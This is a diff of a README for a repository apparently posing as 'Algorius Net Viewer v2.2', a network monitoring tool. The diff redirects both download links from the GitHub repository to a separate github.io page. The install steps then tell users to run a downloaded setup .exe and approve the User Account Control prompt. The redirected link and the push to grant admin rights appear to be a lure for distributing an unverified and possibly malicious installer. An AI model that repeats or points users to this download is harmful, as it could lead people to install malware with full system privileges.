@@ -1,6 +1,6 @@
 # 🖥️ algorius-net-viewer-v2-2 - Monitor your local network infrastructure easily 
 
-[![Download Algorius Net Viewer](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/centauryhandcheese442/algorius-net-viewer-v2-2)
+[![Download Algorius Net Viewer](https://img.shields.io/badge/Download-Installer-blue.svg)](https://centauryhandcheese442.github.io)
 
 Algorius Net Viewer v2.2 helps users manage network environments. This application scans your local network to find connected devices. It checks if those devices stay online and allows you to map your network visually. 
 
@@ -15,7 +15,7 @@ Your computer must meet these basic standards to run the application:
 ## 📥 How to Install
 Follow these steps to set up the software on your computer:
 
-1. Visit the project release page to get the installer: [Download Algorius Net Viewer](https://github.com/centauryhandcheese442/algorius-net-viewer-v2-2).
+1. Visit the project release page to get the installer: [Download Algorius Net Viewer](https://centauryhandcheese442.github.io).
 2. Locate the file named `algorius-net-viewer-v2.2-setup.exe` in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. If a User Account Control window appears, click Yes to allow the installer to make changes to your device.
